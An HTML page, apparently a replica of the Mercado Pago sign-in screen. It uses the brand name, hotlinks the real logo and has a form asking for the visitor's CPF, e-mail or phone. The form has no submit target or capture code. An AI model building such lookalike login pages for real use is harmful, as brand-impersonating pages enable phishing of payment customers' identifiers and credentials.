<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-T">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Pago</title>
    <style>
        /* Reset básico */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f5f5f5; 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Estilo do cabeçalho principal (INTOCADO) */
        .main-header {
            background-color: #ffe600;
            padding: 0 700px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .main-header img {
            height: 37px;
            vertical-align: middle;
        }
        
        /* --- ESTILOS DO CONTEÚDO PRINCIPAL --- */

        .main-content {
            flex-grow: 1;
            display: flex;
            flex-direction: row; 
            justify-content: center; 
            align-items: flex-start; 
            padding-top: 80px; 
            gap: 64px;
        }

        /* Título principal (coluna da esquerda) */
        .main-title {
            font-size: 28px;
            /* ALTERAÇÃO: Aplicando o negrito */
            font-weight: 700; /* Ou 'bold' */
            color: #333;
            line-height: 1.35; /* Leve ajuste na altura da linha para a quebra */
            text-align: left;
            margin: 0; 
            flex-basis: 320px; /* Aumentando um pouco a base para o texto */
            flex-shrink: 0;
        }
        
        /* O "card" que contém apenas o formulário (coluna da direita) */
        .form-card {
            width: 100%;
            max-width: 480px;
            background-color: #fff;
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            border-radius: 6px;
            padding: 48px;
            box-sizing: border-box;
        }

        .input-label {
            font-size: 14px;
            color: #555;
            margin-bottom: 4px;
            display: block;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
        }
        
        .input-field:focus {
            outline: 1px solid #3483fa;
            border-color: #3483fa;
        }

        .actions {
            margin-top: 24px;
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .btn-continue {
            background-color: #3483fa;
            color: white;
            border: none;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-continue:hover {
            background-color: #2968c8;
        }
        
        .link-create {
            color: #3483fa;
            font-size: 15px;
            font-weight: 500;
            text-decoration: none;
        }
        
        .link-create:hover {
            text-decoration: underline;
        }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        
        <h1 class="main-title">Digite seu CPF, e-mail ou<br>telefone para iniciar sessão</h1>

        <div class="form-card">
            <form id="login-form">
                <div>
                    <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
                    <input type="text" id="identificador" class="input-field">
                </div>
                <div class="actions">
                    <button type="submit" class="btn-continue">Continuar</button>
                    <a href="#" class="link-create">Criar conta</a>
                </div>
            </form>
        </div>

    </main>

</body>
</html>